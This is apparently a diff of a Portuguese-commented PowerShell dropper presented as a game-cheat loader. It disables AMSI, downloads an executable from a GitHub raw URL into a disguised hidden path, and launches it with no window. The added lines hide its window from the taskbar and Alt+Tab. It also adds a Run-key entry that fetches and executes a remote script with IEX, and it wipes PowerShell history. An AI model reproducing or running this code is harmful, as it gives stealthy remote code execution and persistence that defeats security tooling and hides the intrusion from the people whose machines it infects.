@@ -2,74 +2,90 @@
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 $url = "https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/koxmenu.exe"
-# Vamos salvar na AppData do usuário em vez da Temp (menos visado)
 $hidePath = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
 
 try {
-    # 1. Baixa o cheat (usando WebClient para não gerar log de requisição HTTP no Event Viewer do Windows)
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($url, $hidePath)
 
-    # 2. Aplica atributos para esconder o arquivo do sistema
-    # Hidden (2) + System (4) = 6. Isso impede que o Windows Search ou usuários vejam o arquivo
+    # Esconde o arquivo no disco
     $fileInfo = Get-Item $hidePath
     $fileInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
 
-    # 3. Código C# para rodar sem janela e sem gerar logs de console
+    # Código C# para rodar E esconder a janela do processo
     $code = @"
 using System;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Threading;
 
 public class GhostProcess {
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     public struct STARTUPINFO {
-        public int cb;
-        public string lpReserved;
-        public string lpDesktop;
-        public string lpTitle;
+        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
         public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
-        public short wShowWindow;
-        public short cbReserved2;
-        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+        public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
     }
-
     [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION {
-        public IntPtr hProcess, hThread;
-        public int dwProcessId, dwThreadId;
-    }
+    public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
 
     [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
+    // APIs para manipular a janela do Windows e esconder o processo
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")]
+    static extern int GetWindowLong(IntPtr hWnd, int nIndex);
+    [DllImport("user32.dll")]
+    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
+
     public static void Run(string path) {
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(si);
-        si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
-        si.wShowWindow = 0;      // SW_HIDE
+        si.dwFlags = 0x00000001;
+        si.wShowWindow = 0; 
         
-        // 0x08000000 = CREATE_NO_WINDOW
-        // 0x00000008 = DETACHED_PROCESS 
-        // 0x00000200 = CREATE_NEW_PROCESS_GROUP
-        uint flags = 0x08000000 | 0x00000008 | 0x00000200;
-        
+        uint flags = 0x08000000 | 0x00000008 | 0x00000200; // CREATE_NO_WINDOW | DETACHED_PROCESS
         PROCESS_INFORMATION pi;
+        
         CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, flags, IntPtr.Zero, null, ref si, out pi);
+
+        // Espera 500ms para o programa abrir a janela dele
+        Thread.Sleep(500); 
+
+        try {
+            Process p = Process.GetProcessById(pi.dwProcessId);
+            IntPtr hWnd = p.MainWindowHandle;
+            
+            if (hWnd != IntPtr.Zero) {
+                // 1. SW_HIDE (0) - Esconde a janela completamente
+                ShowWindow(hWnd, 0); 
+                
+                // 2. Tira o ícone da barra de tarefas e do Alt+Tab
+                int WS_EX_TOOLWINDOW = 0x00000080;
+                int WS_EX_APPWINDOW = 0x00040000;
+                int GWL_EXSTYLE = -20;
+                
+                int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
+                exStyle = (exStyle | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW;
+                SetWindowLong(hWnd, GWL_EXSTYLE, exStyle);
+            }
+        } catch {
+            // Se o processo fechar rápido, ignora
+        }
     }
 }
 "@
     Add-Type -TypeDefinition $code -Language CSharp
     
-    # 4. Executa o processo invisível
+    # Roda o cheat e aplica o bypass de janela
     [GhostProcess]::Run($hidePath)
 
-    # 5. Persistência (O comando no registro está ajustado para chamar o script de novo)
+    # Persistência
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/sync.ps1')`""
     Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value $cmd
 
-    # 6. Limpa histórico do PowerShell
     Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-} catch {
-    # Silêncio total. Se falhar, não faz nada.
-}
+} catch {}
